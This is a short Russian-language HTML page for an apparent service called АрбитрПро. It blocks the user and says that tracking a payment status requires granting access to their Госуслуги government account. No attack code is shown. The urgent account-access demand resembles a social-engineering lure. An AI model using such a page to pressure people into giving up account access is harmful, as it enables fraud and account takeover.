<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#1B8A4A">
    <title>АрбитрПро — Требуется действие</title>
    <link rel="manifest" href="manifest.json">
    <link rel="stylesheet" href="styles.css">
</head>
<body class="blocked-page">
    <header class="top-bar">
        <div class="user-info">
            <div class="user-avatar">ИИ</div>
            <div class="user-name">Иванов Иван Иванович</div>
        </div>
    </header>

    <main class="blocked-content">
        <div class="blocked-icon">🔐</div>
        <h1 class="blocked-title">Требуется действие</h1>
        <p class="blocked-text">
            Для продолжения отслеживания статуса выплаты ПМ необходимо предоставить доступ к Госуслугам.
        </p>
        <p class="blocked-subtext">
            Без этого мы не сможем продолжать процедуру.
        </p>
        <button class="btn-primary btn-large" id="grantAccessBtn">
            Предоставить доступ к Госуслугам
        </button>
        <a href="#" class="blocked-help" id="helpLink">Нужна помощь? Напишите нам</a>
    </main>

    <script src="app.js"></script>
</body>
</html>
